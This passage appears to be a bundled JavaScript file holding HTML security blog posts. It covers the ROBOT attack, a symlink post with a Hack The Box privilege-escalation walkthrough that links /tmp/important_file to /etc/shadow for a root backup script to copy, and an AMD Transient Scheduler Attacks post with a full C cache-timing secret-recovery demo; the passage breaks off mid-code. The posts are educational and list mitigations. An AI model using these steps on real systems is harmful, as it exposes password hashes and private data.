          The ROBOT attack underscores how vulnerabilities from decades ago can resurface in modern systems due to misconfigurations or unpatched software. Although the original Bleichenbacher attack was discovered in 1998, its return in 2017 highlights the importance of staying vigilant in cryptographic practices and regularly updating systems.
        </p>
        <p>
          By disabling RSA key exchanges, patching vulnerable systems, and implementing stronger encryption protocols, administrators can effectively mitigate the risk of ROBOT attacks and protect sensitive data.
        </p>
      </div>
    </section>
  </main>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,tm=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Exploring Symlinks: Practical Usage and Security Implications</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">Exploring Symlinks: Practical Usage and Security Implications</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>What Are Symlinks?</h2>
        <p>
          In Linux, symbolic links are essentially shortcuts that point to other files or directories. They allow you to reference a file or directory without duplicating its contents. Symlinks are incredibly useful when you need to access or organize files in multiple locations. However, if used carelessly, they can create security vulnerabilities, particularly when root-owned processes interact with user-created symlinks.
        </p>

        <h3>Hard Links vs. Symbolic Links</h3>
        <ul>
          <li><strong>Hard Links:</strong> Direct references to data on disk. Hard links share the same inode with the original file, meaning they’re identical and can’t link to directories.</li>
          <li><strong>Symbolic Links (Symlinks):</strong> References that point to the path of a target file or directory. Symlinks are separate from the original file’s data, so deleting the target will break the link.</li>
        </ul>

        <h2>Creating and Using Symlinks</h2>
        <p>The basic syntax for creating a symlink is:</p>
        <div class="code-block">
          <code>ln -s [target] [symlink_name]</code>
        </div>
        <p>
          • <strong>[target]:</strong> The file or directory you want to link to.<br>
          • <strong>[symlink_name]:</strong> The name of your symlink.
        </p>

        <h3>Examples</h3>
        <div class="code-block">
          <code>
# Creating a symlink to a file<br>
ln -s /home/user/documents/file.txt /home/user/desktop/file_link.txt
          </code>
        </div>
        <p>This creates <code>file_link.txt</code> on your desktop, which behaves like a shortcut to <code>file.txt</code>.</p>

        <div class="code-block">
          <code>
# Creating a symlink to a directory<br>
ln -s /home/user/projects /home/user/desktop/projects_link
          </code>
        </div>
        <p>Accessing <code>projects_link</code> will take you directly to <code>/home/user/projects</code>.</p>

        <h3>Overwriting an Existing Symlink</h3>
        <div class="code-block">
          <code>ln -sf /new/target/path /path/to/existing_symlink</code>
        </div>
        <p>The <code>-f</code> option forces the update of the symlink’s target.</p>

        <h2>Privilege Escalation Using Symlinks</h2>
        <p>
          During my Hack The Box challenge, I learned how symlinks can be used to escalate privileges when system configurations are insecure. Here’s how this works:
        </p>

        <h3>Scenario: Exploiting a Root-Owned Script</h3>
        <p>
          Imagine a script (<code>backup.sh</code>) owned by root regularly copies files from a directory to a root-owned backup location. If the script is designed to follow any symlinks it encounters, this could give normal users access to root-level files.
        </p>

        <h3>Steps to Exploit</h3>
        <div class="code-block">
          <code>
# Step 1: Remove any existing file at /tmp/important_file<br>
rm -f /tmp/important_file<br><br>
# Step 2: Create a symlink pointing to /etc/shadow<br>
ln -s /etc/shadow /tmp/important_file<br><br>
# Step 3: Wait for the root script to run or run it manually if possible<br>
          </code>
        </div>
        <p>
          If the root script copies <code>/etc/shadow</code> to a location accessible to the user, the user can potentially gain root-level information and escalate privileges.
        </p>

        <h2>Mitigating This Exploit</h2>
        <ul>
          <li><strong>Avoid Following Symlinks in Scripts:</strong> Avoid copying or modifying files without checking for symlinks, especially in root-owned scripts.</li>
          <li><strong>Use the <code>-P</code> Option in <code>cp</code>:</strong> This flag tells <code>cp</code> not to follow symlinks, helping to prevent exploitation.</li>
          <li><strong>Restrict Writable Directories:</strong> Limit permissions on directories where files are written or manipulated by privileged processes.</li>
        </ul>

        <h2>Conclusion</h2>
        <p>
          Symlinks are an incredibly powerful tool for managing files and directories, but they come with inherent risks if not handled carefully. Understanding how symlinks work and the potential security implications is critical for both system administrators and security professionals. Whether you're organizing files or working on penetration testing challenges, symlinks offer both utility and insight into system-level operations.
        </p>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,sm=`<div class="markdown-heading"><h1 class="heading-element">Transient Scheduler Attacks on CPUs: Exploiting AMD’s New Microarchitectural Leak</h1><a id="user-content-transient-scheduler-attacks-on-cpus-exploiting-amds-new-microarchitectural-leak" class="anchor" aria-label="Permalink: Transient Scheduler Attacks on CPUs: Exploiting AMD’s New Microarchitectural Leak" href="#transient-scheduler-attacks-on-cpus-exploiting-amds-new-microarchitectural-leak"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>In 2018, <em>Spectre</em> and <em>Meltdown</em> taught everyone that “just running code” on a CPU was enough to leak data you were <em>never</em> supposed to see. We patched, mitigated, and told ourselves the worst was over.</p>
<p>Fast-forward to 2025 and AMD quietly drops a new phrase into the hardware-security lexicon:</p>
<blockquote>
<p><strong>Transient Scheduler Attacks (TSA)</strong> – a fresh class of speculative side-channel leaks in AMD CPUs, abusing the <em>instruction scheduler</em> itself.</p>
</blockquote>
<p>If Spectre was about mispredicted branches and Meltdown about rogue loads, TSA is about <strong>“false completions”</strong>: the CPU momentarily believes a load has finished and forwards <em>invalid</em> data into dependent instructions. That data isn’t architecturally visible—but it <em>does</em> change how long later instructions take to execute, and those timing differences leak information across privilege boundaries.</p>
<p>In this post, we’ll unpack TSA from a red-team mindset:</p>
<ul>
<li>What TSA actually is (minus marketing),</li>
<li>How an attacker could <em>conceptually</em> exploit it,</li>
<li>A tiny lab you can build to “feel” this class of leak,</li>
<li>And what defenders should do before their schedulers start talking.</li>
</ul>
<hr>
<div class="markdown-heading"><h2 class="heading-element">1. Quick refresher: speculative execution &amp; side-channels</h2><a id="user-content-1-quick-refresher-speculative-execution--side-channels" class="anchor" aria-label="Permalink: 1. Quick refresher: speculative execution &amp; side-channels" href="#1-quick-refresher-speculative-execution--side-channels"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>Modern CPUs are performance junkies. They:</p>
<ul>
<li>
<strong>Speculatively execute</strong> instructions before they’re 100% sure they’re needed (branch prediction, memory prediction, etc.).</li>
<li>
<strong>Out-of-order schedule</strong> instructions to keep execution units busy.</li>
<li>
<strong>Forward data</strong> between loads and stores without waiting for the full memory pipeline.</li>
</ul>
<p>Most of the time, that works great. Occasionally, it creates <strong>transient states</strong> where:</p>
<ol>
<li>The CPU does some work based on <em>guessed</em> information,</li>
<li>Later realizes it guessed wrong,</li>
<li>Rolls back the architectural state…</li>
<li>But the <strong>microarchitectural state</strong> (caches, predictors, queues, timing) still remembers what happened.</li>
</ol>
<p>Classic attacks:</p>
<ul>
<li>
<strong>Spectre</strong>: abuse branch prediction → transiently execute code that touches secret-dependent memory → leak via cache timing.</li>
<li>
<strong>Meltdown / Foreshadow / MDS</strong>: abuse permission checks and internal buffers to read data across isolation boundaries.</li>
</ul>
<p>TSA is the same story <em>one layer deeper</em>: not the branch predictor, not the cache hierarchy, but the <strong>scheduler and its perception of whether a load is “done.”</strong></p>
<hr>
<div class="markdown-heading"><h2 class="heading-element">2. What AMD calls “Transient Scheduler Attacks”</h2><a id="user-content-2-what-amd-calls-transient-scheduler-attacks" class="anchor" aria-label="Permalink: 2. What AMD calls “Transient Scheduler Attacks”" href="#2-what-amd-calls-transient-scheduler-attacks"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>AMD’s 2025 security bulletin and technical whitepaper describe TSA as a new speculative side channel that appears when certain <strong>load instructions experience “false completion.”</strong></p>
<div class="markdown-heading"><h3 class="heading-element">2.1 False completions in a nutshell</h3><a id="user-content-21-false-completions-in-a-nutshell" class="anchor" aria-label="Permalink: 2.1 False completions in a nutshell" href="#21-false-completions-in-a-nutshell"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>Under specific timing and microarchitectural conditions:</p>
<ol>
<li>A load instruction is expected to hit in a fast structure (e.g., L1 cache).</li>
<li>Hardware <em>optimistically</em> assumes the data will be ready quickly.</li>
<li>Dependent operations get scheduled based on that assumption.</li>
<li>But something goes wrong – the load <em>didn’t</em> actually complete (it missed in L1, or the store data isn’t ready, etc.).</li>
<li>The CPU forwards <strong>invalid data</strong> to dependent instructions temporarily.</li>
<li>The load is later re-executed with the correct data, and dependents re-run.</li>
</ol>
<p>Crucially:</p>
<ul>
<li>You don’t get a pipeline flush like some other transient behaviors.</li>
<li>That invalid data <strong>doesn’t update caches or TLBs</strong>, so you can’t see it with classic cache-based side-channels.</li>
<li>But the invalid data <em>does</em> influence the <strong>timing</strong> of other instructions in the core, and that timing is observable.</li>
</ul>
<p>Hence: <strong>Transient Scheduler Attacks</strong> – you leak data by watching how the scheduler behaves when it has been lied to.</p>
<div class="markdown-heading"><h3 class="heading-element">2.2 Two main variants: TSA-L1 and TSA-SQ</h3><a id="user-content-22-two-main-variants-tsa-l1-and-tsa-sq" class="anchor" aria-label="Permalink: 2.2 Two main variants: TSA-L1 and TSA-SQ" href="#22-two-main-variants-tsa-l1-and-tsa-sq"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>AMD’s technical guidance splits TSA into two sub-variants:</p>
<ul>
<li>
<p><strong>TSA-L1 (L1 data cache variant)</strong></p>
<ul>
<li>Modern AMD cores use a <strong>microtag</strong> structure to accelerate L1 lookups.</li>
<li>In some edge cases, the microtag says “hit” when the real L1 line isn’t there.</li>
<li>The load experiences a false completion and receives invalid data from whatever was associated with that microtag entry.</li>
<li>An attacker who can repeatedly engineer this state can infer <strong>what’s in the L1 cache</strong>, even if it belongs to:
<ul>
<li>OS kernel vs user process,</li>
<li>Hypervisor vs guest VM,</li>
<li>One VM vs another.</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>TSA-SQ (store queue variant)</strong></p>
<ul>
<li>The store queue tracks in-flight stores and sometimes forwards their data to matching loads (<strong>Store-To-Load Forwarding</strong>).</li>
<li>In some timing windows, a load that matches an older store may see a false completion where invalid data comes from a <em>previous</em> occupant of that store-queue entry.</li>
<li>An attacker may infer data from older stores—potentially across kernel/user boundaries—but cross-VM leakage here appears more limited.</li>
</ul>
</li>
</ul>
<p>So TSA-L1 is your <strong>“peek into L1 from another context”</strong> scenario, whereas TSA-SQ is more like <strong>“see what older stores were doing”</strong> if you can hit the timing window.</p>
<div class="markdown-heading"><h3 class="heading-element">2.3 Affected CPUs &amp; severity</h3><a id="user-content-23-affected-cpus--severity" class="anchor" aria-label="Permalink: 2.3 Affected CPUs &amp; severity" href="#23-affected-cpus--severity"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<ul>
<li>TSA affects <strong>AMD Family 19h</strong> processors (Zen 3 / Zen 4 class parts, including EPYC and Ryzen families).</li>
<li>Individual CVEs are rated in the “medium” band, but collectively TSA is treated as a <strong>speculative side-channel class</strong> that can leak data across privilege boundaries.</li>
<li>AMD is shipping <strong>microcode updates</strong> plus OS/hypervisor guidance; the Linux kernel added a dedicated <code>MITIGATION_TSA</code> config option and a <code>tsa=</code> boot parameter to toggle mitigation strategies.</li>
</ul>
<p>In other words: TSA isn’t “you can RCE the CPU via JavaScript,” but it <em>is</em> “if an attacker can run code on the same CPU, they may spy on higher-privileged contexts.”</p>
<hr>
<div class="markdown-heading"><h2 class="heading-element">3. How would an attacker actually abuse TSA?</h2><a id="user-content-3-how-would-an-attacker-actually-abuse-tsa" class="anchor" aria-label="Permalink: 3. How would an attacker actually abuse TSA?" href="#3-how-would-an-attacker-actually-abuse-tsa"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>From a red-team point of view, TSA is about <strong>turning local code execution into a powerful side-channel primitive</strong>.</p>
<p>AMD is quite explicit about preconditions:</p>
<blockquote>
<p>TSA is likely only exploitable if the attacker can run arbitrary code on the machine and can repeatedly trigger victim activity to build up a measurable signal.</p>
</blockquote>
<p>So think <strong>“post-compromise escalation / stealth data theft”</strong>, not “remote drive-by.”</p>
<div class="markdown-heading"><h3 class="heading-element">3.1 Threat models that actually make sense</h3><a id="user-content-31-threat-models-that-actually-make-sense" class="anchor" aria-label="Permalink: 3.1 Threat models that actually make sense" href="#31-threat-models-that-actually-make-sense"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>Some realistic scenarios:</p>
<ol>
<li>
<p><strong>Malicious VM in a public cloud</strong></p>
<ul>
<li>You rent a VM on a shared EPYC host.</li>
<li>You arrange your workload so that:
<ul>
<li>Your VM executes carefully crafted load/store sequences, trying to create false completions,</li>
<li>You constantly measure timing of your own code,</li>
<li>You synchronize with a high-value victim VM (e.g., by hitting its web API, causing it to perform sensitive operations repeatedly).</li>
</ul>
</li>
<li>Over many iterations, you try to reconstruct bits of secrets used in the victim: crypto keys, keystroke patterns, or data-dependent control paths.</li>
</ul>
</li>
<li>
<p><strong>Untrusted plugin / extension in a multi-tenant app</strong></p>
<ul>
<li>Think: a plugin system where tenants can upload native or WASM modules and get CPU time on the same host as privileged code.</li>
<li>The plugin runs malicious code that tries to observe kernel or hypervisor behavior via TSA-style timing leaks, especially across system calls or hypercalls.</li>
</ul>
</li>
<li>
<p><strong>Malware on a bare-metal server</strong></p>
<ul>
<li>Traditional malware already has local execution.</li>
<li>TSA gives it a way to break isolation between:
<ul>
<li>Normal user processes and privileged daemons,</li>
<li>Or between containers that happen to share cores.</li>
</ul>
</li>
</ul>
</li>
</ol>
<p>In <em>all</em> these cases, TSA doesn’t give you code execution; it gives you a <strong>new, stealthy information-leak channel</strong> once you’re on the box.</p>
<div class="markdown-heading"><h3 class="heading-element">3.2 What does “exploitation” look like?</h3><a id="user-content-32-what-does-exploitation-look-like" class="anchor" aria-label="Permalink: 3.2 What does “exploitation” look like?" href="#32-what-does-exploitation-look-like"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>High-level exploitation strategy (similar in spirit to other speculative side channels):</p>
<ol>
<li>
<p><strong>Prime microarchitectural state</strong></p>
<ul>
<li>Arrange L1 cache or store queue to contain patterns that encode guesses about victim data (or vice versa).</li>
</ul>
</li>
<li>
<p><strong>Trigger victim computation</strong></p>
<ul>
<li>System call, network request, hypercall—anything that causes the victim to touch sensitive data.</li>
<li>Repeat this many times so you can average out noise.</li>
</ul>
</li>
<li>
<p><strong>Force false completions</strong></p>
<ul>
<li>Using carefully chosen addresses and instruction sequences, steer certain victim or attacker loads into the microtag / store-queue corner cases described in TSA-L1 and TSA-SQ.</li>
</ul>
</li>
<li>
<p><strong>Measure timing in attacker context</strong></p>
<ul>
<li>The invalid forwarded data doesn’t leak directly, but it changes how long later instructions take to execute.</li>
<li>By correlating timing patterns with what you know you primed, you infer bits of secret state in the victim’s cache lines or stores.</li>
</ul>
</li>
<li>
<p><strong>Do this… a lot</strong></p>
<ul>
<li>TSA is noisy. You typically need many victim invocations to create a measurable signal.</li>
</ul>
</li>
</ol>
<p>If that sounds abstract, that’s because it is—<strong>real TSA exploitation is non-trivial</strong>. But you can build a lab to internalize the shape of the attack.</p>
<hr>
<div class="markdown-heading"><h2 class="heading-element">4. A tiny lab to “feel” scheduler-style leaks (with code)</h2><a id="user-content-4-a-tiny-lab-to-feel-scheduler-style-leaks-with-code" class="anchor" aria-label="Permalink: 4. A tiny lab to “feel” scheduler-style leaks (with code)" href="#4-a-tiny-lab-to-feel-scheduler-style-leaks-with-code"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>We’re still <strong>not</strong> reproducing TSA itself (that’s complex research), but we can build a lab that:</p>
<ul>
<li>Shows how <strong>secret-dependent memory access → timing difference → information leak</strong> works, and</li>
<li>Uses patterns similar to what real speculative / transient attacks exploit.</li>
</ul>
<p>Think of this as a <strong>Flush+Reload / cache timing 101</strong> exercise that warms people up conceptually for TSA.</p>
<blockquote>
<p><g-emoji class="g-emoji" alias="warning">⚠️</g-emoji> Educational only. Run this only on machines you own. Don’t point this at shared environments you don’t control.</p>
</blockquote>
<div class="markdown-heading"><h3 class="heading-element">4.1 Full toy example: secret-dependent access + timing</h3><a id="user-content-41-full-toy-example-secret-dependent-access--timing" class="anchor" aria-label="Permalink: 4.1 Full toy example: secret-dependent access + timing" href="#41-full-toy-example-secret-dependent-access--timing"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>This is a self-contained C toy that:</p>
<ul>
<li>Has a “secret” byte,</li>
<li>A victim function that touches memory depending on that secret,</li>
<li>An attacker that measures which memory line is “hot” by timing loads with <code>rdtsc</code>.</li>
</ul>
<div class="highlight highlight-source-c"><pre><span class="pl-c">// gcc -O2 -march=native -o tsa_toy tsa_toy.c</span>
<span class="pl-c">// Simple educational cache timing demo:</span>
<span class="pl-c">//  - victim_operation() uses a secret-dependent index</span>
<span class="pl-c">//  - attacker measures which index is fastest to infer the secret</span>

<span class="pl-k">#define</span> <span class="pl-s1">_GNU_SOURCE</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;stdio.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;stdint.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;x86intrin.h&gt;</span>   <span class="pl-c">// for __rdtscp, _mm_clflush</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;unistd.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;limits.h&gt;</span>

<span class="pl-k">#define</span> <span class="pl-c1">STRIDE</span> 4096      // ensure different cache lines
<span class="pl-k">#define</span> <span class="pl-c1">PROBE_SIZE</span> 256

<span class="pl-c">// Shared array used as our "probe" for timing</span>
<span class="pl-smi">uint8_t</span> <span class="pl-s1">probe_array</span>[<span class="pl-c1">PROBE_SIZE</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>];

<span class="pl-c">// Fake secret we want to "leak"</span>
<span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-s1">secret</span> <span class="pl-c1">=</span> <span class="pl-c1">0x42</span>;  <span class="pl-c">// 66 decimal</span>

<span class="pl-c">// Victim: uses attacker-controlled hint, mixed with secret, to pick an index</span>
<span class="pl-smi">void</span> <span class="pl-en">victim_operation</span>(<span class="pl-smi">uint8_t</span> <span class="pl-s1">attacker_hint</span>) {
    <span class="pl-smi">uint8_t</span> <span class="pl-s1">idx</span> <span class="pl-c1">=</span> <span class="pl-s1">attacker_hint</span> ^ <span class="pl-s1">secret</span>;  <span class="pl-c">// secret-dependent index</span>
    <span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-c1">*</span><span class="pl-s1">addr</span> <span class="pl-c1">=</span> <span class="pl-c1">&amp;</span><span class="pl-s1">probe_array</span>[<span class="pl-s1">idx</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>];

    <span class="pl-c">// Load from secret-dependent location</span>
    <span class="pl-smi">uint8_t</span> <span class="pl-s1">value</span> <span class="pl-c1">=</span> <span class="pl-c1">*</span><span class="pl-s1">addr</span>;

    <span class="pl-c">// Prevent the compiler from optimizing away the load</span>
    __asm__ <span class="pl-k">volatile</span>(<span class="pl-s">""</span> :: <span class="pl-s">"r"</span>(<span class="pl-s1">value</span>) : <span class="pl-s">"memory"</span>);
}

<span class="pl-c">// Flush entire probe_array from caches</span>
<span class="pl-smi">void</span> <span class="pl-en">flush_probe_array</span>(<span class="pl-smi">void</span>) {
    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">i</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">i</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">PROBE_SIZE</span>; <span class="pl-s1">i</span><span class="pl-c1">++</span>) {
        <span class="pl-en">_mm_clflush</span>(<span class="pl-c1">&amp;</span><span class="pl-s1">probe_array</span>[<span class="pl-s1">i</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>]);
    }
}

<span class="pl-c">// Measure time to access probe_array[idx * STRIDE]</span>
<span class="pl-smi">uint32_t</span> <span class="pl-en">time_access</span>(<span class="pl-smi">int</span> <span class="pl-s1">idx</span>) {
    <span class="pl-smi">unsigned <span class="pl-smi">int</span></span> <span class="pl-s1">aux</span>;
    <span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-c1">*</span><span class="pl-s1">addr</span> <span class="pl-c1">=</span> <span class="pl-c1">&amp;</span><span class="pl-s1">probe_array</span>[<span class="pl-s1">idx</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>];

    <span class="pl-smi">uint64_t</span> <span class="pl-s1">t1</span> <span class="pl-c1">=</span> <span class="pl-en">__rdtscp</span>(<span class="pl-c1">&amp;</span><span class="pl-s1">aux</span>);
    (<span class="pl-smi">void</span>)<span class="pl-c1">*</span><span class="pl-s1">addr</span>;
    <span class="pl-smi">uint64_t</span> <span class="pl-s1">t2</span> <span class="pl-c1">=</span> <span class="pl-en">__rdtscp</span>(<span class="pl-c1">&amp;</span><span class="pl-s1">aux</span>);

    <span class="pl-k">return</span> (<span class="pl-smi">uint32_t</span>)(<span class="pl-s1">t2</span> <span class="pl-c1">-</span> <span class="pl-s1">t1</span>);
}

<span class="pl-smi">int</span> <span class="pl-en">main</span>(<span class="pl-smi">void</span>) {
    <span class="pl-c">// 1. Initialize array to force allocation</span>
    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">i</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">i</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">PROBE_SIZE</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>; <span class="pl-s1">i</span><span class="pl-c1">++</span>) {
        <span class="pl-s1">probe_array</span>[<span class="pl-s1">i</span>] <span class="pl-c1">=</span> <span class="pl-c1">1</span>;
    }

    <span class="pl-c">// Attacker chooses a hint. For simplicity we fix it.</span>
    <span class="pl-smi">uint8_t</span> <span class="pl-s1">attacker_hint</span> <span class="pl-c1">=</span> <span class="pl-c1">0x10</span>;

    <span class="pl-c">// 2. Flush the probe_array from cache</span>
    <span class="pl-en">flush_probe_array</span>();

    <span class="pl-c">// 3. Trigger victim many times to strengthen the signal</span>
    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">i</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">i</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">1000</span>; <span class="pl-s1">i</span><span class="pl-c1">++</span>) {
        <span class="pl-en">victim_operation</span>(<span class="pl-s1">attacker_hint</span>);
    }

    <span class="pl-c">// 4. Measure timing for each possible index and find fastest</span>
    <span class="pl-smi">uint32_t</span> <span class="pl-s1">best_time</span> <span class="pl-c1">=</span> <span class="pl-c1">UINT_MAX</span>;
    <span class="pl-smi">int</span> <span class="pl-s1">best_idx</span> <span class="pl-c1">=</span> <span class="pl-c1">-1</span>;

    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">idx</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">idx</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">PROBE_SIZE</span>; <span class="pl-s1">idx</span><span class="pl-c1">++</span>) {
        <span class="pl-smi">uint32_t</span> <span class="pl-s1">t</span> <span class="pl-c1">=</span> <span class="pl-en">time_access</span>(<span class="pl-s1">idx</span>);
        <span class="pl-k">if</span> (<span class="pl-s1">t</span> <span class="pl-c1">&lt;</span> <span class="pl-s1">best_time</span>) {
            <span class="pl-s1">best_time</span> <span class="pl-c1">=</span> <span class="pl-s1">t</span>;
            <span class="pl-s1">best_idx</span> <span class="pl-c1">=</span> <span class="pl-s1">idx</span>;
        }
    }

    <span class="pl-en">printf</span>(<span class="pl-s">"Best index = %d (time = %u cycles)\\n"</span>, <span class="pl-s1">best_idx</span>, <span class="pl-s1">best_time</span>);

    <span class="pl-c">// Recover an approximation of the secret</span>
    <span class="pl-smi">uint8_t</span> <span class="pl-s1">recovered</span> <span class="pl-c1">=</span> <span class="pl-s1">attacker_hint</span> ^ (<span class="pl-smi">uint8_t</span>)<span class="pl-s1">best_idx</span>;
    <span class="pl-en">printf</span>(<span class="pl-s">"Actual secret    = 0x%02x\\n"</span>, <span class="pl-s1">secret</span>);
    <span class="pl-en">printf</span>(<span class="pl-s">"Recovered secret = 0x%02x\\n"</span>, <span class="pl-s1">recovered</span>);

    <span class="pl-k">return</span> <span class="pl-c1">0</span>;
}</pre></div>
<p>What’s happening here:</p>
<ul>
<li>The victim repeatedly touches <code>probe_array[(attacker_hint ^ secret) * STRIDE]</code>,</li>
<li>That specific cache line becomes hot,</li>
<li>The attacker times every index and infers which is fastest,</li>
<li>From that <code>best_idx</code>, it guesses <code>secret ≈ attacker_hint ^ best_idx</code>.</li>
</ul>
<p>This is the <strong>same mental structure</strong> as real microarchitectural leaks: you never read the secret directly; you watch how <strong>transient microarchitectural state changes timing</strong>.</p>
<p>On a modern CPU, you may need to run it multiple times, average results, or tweak <code>PROBE_SIZE</code> / <code>STRIDE</code> to get a clear signal.</p>
<div class="markdown-heading"><h3 class="heading-element">4.2 Variant without <code>rdtsc</code>: using <code>clock_gettime</code>
</h3><a id="user-content-42-variant-without-rdtsc-using-clock_gettime" class="anchor" aria-label="Permalink: 4.2 Variant without rdtsc: using clock_gettime" href="#42-variant-without-rdtsc-using-clock_gettime"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>If you want a version that doesn’t rely on <code>rdtsc</code> (e.g., on some systems it may be restricted or noisy), here’s a variant using <code>clock_gettime</code> with <code>CLOCK_MONOTONIC_RAW</code>. It’s less precise but more portable.</p>
<div class="highlight highlight-source-c"><pre><span class="pl-c">// gcc -O2 -march=native -o tsa_toy_posix tsa_toy_posix.c</span>

<span class="pl-k">#define</span> <span class="pl-s1">_GNU_SOURCE</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;stdio.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;stdint.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;time.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;x86intrin.h&gt;</span>   <span class="pl-c">// for _mm_clflush</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;unistd.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;limits.h&gt;</span>

<span class="pl-k">#define</span> <span class="pl-c1">STRIDE</span> 4096
<span class="pl-k">#define</span> <span class="pl-c1">PROBE_SIZE</span> 256

<span class="pl-smi">uint8_t</span> <span class="pl-s1">probe_array</span>[<span class="pl-c1">PROBE_SIZE</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>];
<span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-s1">secret</span> <span class="pl-c1">=</span> <span class="pl-c1">0x2A</span>;  <span class="pl-c">// 42 decimal</span>

<span class="pl-k">static</span> <span class="pl-k">inline</span> <span class="pl-smi">uint64_t</span> <span class="pl-en">nsec_now</span>(<span class="pl-smi">void</span>) {
    <span class="pl-k">struct</span> <span class="pl-smi">timespec</span> <span class="pl-s1">ts</span>;
    <span class="pl-en">clock_gettime</span>(<span class="pl-c1">CLOCK_MONOTONIC_RAW</span>, <span class="pl-c1">&amp;</span><span class="pl-s1">ts</span>);
    <span class="pl-k">return</span> (<span class="pl-smi">uint64_t</span>)<span class="pl-s1">ts</span>.<span class="pl-c1">tv_sec</span> <span class="pl-c1">*</span> <span class="pl-c1">1000000000ull</span> <span class="pl-c1">+</span> <span class="pl-s1">ts</span>.<span class="pl-c1">tv_nsec</span>;
}

<span class="pl-smi">void</span> <span class="pl-en">victim_operation</span>(<span class="pl-smi">uint8_t</span> <span class="pl-s1">attacker_hint</span>) {
    <span class="pl-smi">uint8_t</span> <span class="pl-s1">idx</span> <span class="pl-c1">=</span> <span class="pl-s1">attacker_hint</span> ^ <span class="pl-s1">secret</span>;
    <span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-c1">*</span><span class="pl-s1">addr</span> <span class="pl-c1">=</span> <span class="pl-c1">&amp;</span><span class="pl-s1">probe_array</span>[<span class="pl-s1">idx</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>];
    <span class="pl-smi">uint8_t</span> <span class="pl-s1">value</span> <span class="pl-c1">=</span> <span class="pl-c1">*</span><span class="pl-s1">addr</span>;
    __asm__ <span class="pl-k">volatile</span>(<span class="pl-s">""</span> :: <span class="pl-s">"r"</span>(<span class="pl-s1">value</span>) : <span class="pl-s">"memory"</span>);
}

<span class="pl-smi">void</span> <span class="pl-en">flush_probe_array</span>(<span class="pl-smi">void</span>) {
